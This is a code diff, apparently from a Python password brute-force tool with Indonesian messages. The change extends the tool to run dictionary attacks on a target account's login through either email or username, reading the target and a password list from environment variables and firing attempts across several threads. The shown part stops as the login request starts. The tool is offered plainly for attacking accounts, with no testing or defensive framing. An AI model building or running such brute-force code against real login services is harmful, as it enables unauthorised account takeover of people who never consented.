@@ -7,17 +7,45 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-URL = os.getenv("TARGET_URL")
+BASE_URL = os.getenv("BASE_URL", "").rstrip("/")
+URL = os.getenv("TARGET_URL", "")
+AUTH_MODE = os.getenv("AUTH_MODE", "email").strip().lower()
 TARGET_EMAIL = os.getenv("TARGET_EMAIL")
+TARGET_USERNAME = os.getenv("TARGET_USERNAME")
 PASSWORD_FILE = os.getenv("PASSWORD_FILE", "pass.txt")
 THREADS = int(os.getenv("THREADS", 5))
 SUCCESS_INDICATOR = os.getenv("SUCCESS_INDICATOR", "success")
+
+if not URL:
+    if not BASE_URL:
+        raise SystemExit("BASE_URL atau TARGET_URL wajib diisi")
+
+    if AUTH_MODE == "email":
+        URL = f"{BASE_URL}"
+    elif AUTH_MODE == "username":
+        URL = f"{BASE_URL}"
+    else:
+        raise SystemExit("AUTH_MODE harus 'email' atau 'username'")
 
 
 def attempt_login(password):
     password = password.strip()
     # Payload dalam bentuk dictionary untuk dikirim sebagai JSON
-    payload = {"email": TARGET_EMAIL, "password": password}
+    payload = {"password": password}
+
+    if AUTH_MODE == "email":
+        if not TARGET_EMAIL:
+            print("TARGET_EMAIL belum diisi")
+            return False
+        payload["email"] = TARGET_EMAIL
+    elif AUTH_MODE == "username":
+        if not TARGET_USERNAME:
+            print("TARGET_USERNAME belum diisi")
+            return False
+        payload["username"] = TARGET_USERNAME
+    else:
+        print("AUTH_MODE harus 'email' atau 'username'")
+        return False
 
     start = time.time()
     try:
